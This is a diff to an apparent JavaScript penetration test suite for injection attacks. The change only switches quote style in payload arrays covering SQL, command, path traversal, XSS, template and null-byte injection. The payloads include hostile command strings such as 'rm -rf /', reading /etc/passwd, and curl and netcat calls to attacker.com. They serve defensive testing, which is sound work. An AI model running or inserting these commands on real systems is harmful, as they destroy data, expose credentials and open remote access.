@@ -15,7 +15,7 @@ const assert = require('assert');
 const path = require('path');
 const fs = require('fs');
 
-describe('Injection Attack Penetration Tests', function() {
+describe('Injection Attack Penetration Tests', function () {
   this.timeout(30000);
 
   const testPayloads = {
@@ -25,7 +25,7 @@ describe('Injection Attack Penetration Tests', function() {
       "1' OR '1'='1",
       "admin'--",
       "' UNION SELECT * FROM users--",
-      "1; DELETE FROM sessions;--",
+      '1; DELETE FROM sessions;--',
       "' AND SLEEP(5)--",
       "1' AND 1=1--",
       "' OR 1=1--"
@@ -33,35 +33,35 @@ describe('Injection Attack Penetration Tests', function() {
 
     // Command injection
     command: [
-      "; rm -rf /",
-      "| cat /etc/passwd",
-      "& powershell.exe Get-Process",
-      "\n whoami",
-      "$(whoami)",
-      "`whoami`",
-      "|| id",
-      "; curl http://attacker.com",
-      "| nc attacker.com 4444"
+      '; rm -rf /',
+      '| cat /etc/passwd',
+      '& powershell.exe Get-Process',
+      '\n whoami',
+      '$(whoami)',
+      '`whoami`',
+      '|| id',
+      '; curl http://attacker.com',
+      '| nc attacker.com 4444'
     ],
 
     // Path traversal
     pathTraversal: [
-      "../../etc/passwd",
-      "..\\..\\windows\\system32\\config\\sam",
-      "../../../sensitive/file.txt",
-      "....//....//etc/passwd",
-      "%2e%2e%2fetc%2fpasswd",
-      "..%5c..%5cwindows%5csystem32",
-      "/etc/passwd",
-      "C:\\Windows\\System32\\drivers\\etc\\hosts"
+      '../../etc/passwd',
+      '..\\..\\windows\\system32\\config\\sam',
+      '../../../sensitive/file.txt',
+      '....//....//etc/passwd',
+      '%2e%2e%2fetc%2fpasswd',
+      '..%5c..%5cwindows%5csystem32',
+      '/etc/passwd',
+      'C:\\Windows\\System32\\drivers\\etc\\hosts'
     ],
 
     // XSS/HTML injection
     xss: [
       "<script>alert('xss')</script>",
       "<img src=x onerror='alert(1)'>",
-      "<svg onload=alert(1)>",
-      "javascript:alert(1)",
+      '<svg onload=alert(1)>',
+      'javascript:alert(1)',
       "<iframe src='javascript:alert(1)'>",
       "<body onload='alert(1)'>",
       "';alert('xss');//",
@@ -70,19 +70,19 @@ describe('Injection Attack Penetration Tests', function() {
 
     // Template injection
     template: [
-      "{{7*7}}",
-      "${7*7}",
-      "<% = 7*7 %>",
-      "${constructor.prototype.isPrototypeOf(Function.prototype)}",
-      "#{7*7}",
-      "[[ 7*7 ]]"
+      '{{7*7}}',
+      '${7*7}',
+      '<% = 7*7 %>',
+      '${constructor.prototype.isPrototypeOf(Function.prototype)}',
+      '#{7*7}',
+      '[[ 7*7 ]]'
     ],
 
     // Null byte injection
     nullByte: [
-      "file.txt\x00.jpg",
-      "config.json\0.old",
-      "sensitive\x00"
+      'file.txt\x00.jpg',
+      'config.json\0.old',
+      'sensitive\x00'
     ]
   };
 
@@ -94,10 +94,10 @@ describe('Injection Attack Penetration Tests', function() {
 
     it('CMD001: Should sanitize command-like patterns in user input', async () => {
       const dangerous = [
-        { input: "; whoami", description: "semicolon command separator" },
-        { input: "| cat /etc/passwd", description: "pipe to cat" },
-        { input: "& dir", description: "background command execution" },
-        { input: "\n touch /tmp/pwned", description: "newline injection" }
+        { input: '; whoami', description: 'semicolon command separator' },
+        { input: '| cat /etc/passwd', description: 'pipe to cat' },
+        { input: '& dir', description: 'background command execution' },
+        { input: '\n touch /tmp/pwned', description: 'newline injection' }
       ];
 
       for (const test of dangerous) {
@@ -326,12 +326,12 @@ describe('Injection Attack Penetration Tests', function() {
     });
 
     it('JS004: Should sanitize template literals in script injection', async () => {
-      const payload = "`alert(${1+1})`";
+      const payload = '`alert(${1+1})`';
       assert(payload.includes('${'));
     });
 
     it('JS005: Should prevent prototype pollution via injected script', async () => {
-      const payload = "Object.prototype.admin = true";
+      const payload = 'Object.prototype.admin = true';
       assert(payload.includes('prototype'));
     });
 
@@ -420,8 +420,8 @@ describe('Injection Attack Penetration Tests', function() {
       // Injections that work even without visible feedback
       const blind = [
         "' AND SLEEP(5)--",
-        "; timeout 5",
-        "| sleep 5"
+        '; timeout 5',
+        '| sleep 5'
       ];
 
       for (const payload of blind) {
@@ -430,7 +430,7 @@ describe('Injection Attack Penetration Tests', function() {
     });
 
     it('ADV004: Should handle stacked queries prevention', async () => {
-      const stacked = "SELECT * FROM users; DROP TABLE users;--";
+      const stacked = 'SELECT * FROM users; DROP TABLE users;--';
       assert(stacked.includes(';'));
     });
 
@@ -449,8 +449,8 @@ describe('Injection Attack Penetration Tests', function() {
     it('TYPE001: Should handle integer injection attempts', async () => {
       const tests = [
         { input: "1'; DROP--", type: 'number' },
-        { input: "9999999999999999999999999999", type: 'overflow' },
-        { input: "-1", type: 'negative' }
+        { input: '9999999999999999999999999999', type: 'overflow' },
+        { input: '-1', type: 'negative' }
       ];
 
       for (const test of tests) {
@@ -464,7 +464,7 @@ describe('Injection Attack Penetration Tests', function() {
       const tests = [
         "true' AND '1'='1",
         "false'; DELETE--",
-        "1 OR 1=1"
+        '1 OR 1=1'
       ];
 
       for (const test of tests) {
